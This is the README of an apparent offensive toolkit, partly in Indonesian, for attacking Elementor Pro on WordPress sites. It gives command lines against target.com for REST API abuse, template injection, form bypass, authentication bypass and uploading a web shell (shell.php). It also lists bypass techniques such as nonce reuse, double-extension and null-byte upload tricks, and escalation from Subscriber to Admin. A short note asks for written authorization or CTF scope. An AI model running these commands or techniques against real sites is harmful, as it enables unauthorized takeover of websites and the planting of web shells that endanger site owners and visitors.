# elementor-bypass v1.0

Elementor Pro bypass & exploitation toolkit.

## Perintah

```bash
python3 elementor_bypass.py rest --url https://target.com --action cpt
python3 elementor_bypass.py template --url https://target.com --id 123
python3 elementor_bypass.py form --url https://target.com --id 456
python3 elementor_bypass.py upload --url https://target.com --file shell.php
python3 elementor_bypass.py auth --url https://target.com
```

## Fitur

| Perintah | Fungsi |
|---|---|
| `rest` | REST API abuse (CPT, template, form) |
| `template` | Template injection & render |
| `form` | Form action bypass |
| `upload` | File upload bypass |
| `auth` | Authentication bypass |

## Bypass Techniques

- REST API unauthenticated access
- Template render (no auth)
- AJAX nopriv (no auth)
- Nonce bypass/reuse
- File upload (double extension, null byte, magic bytes)
- Privilege escalation (Subscriber → Editor → Admin)

## Aturan pakai

- **Wajib** otorisasi tertulis / CTF scope
- Jangan produksi tanpa izin
- Output = attack artifact
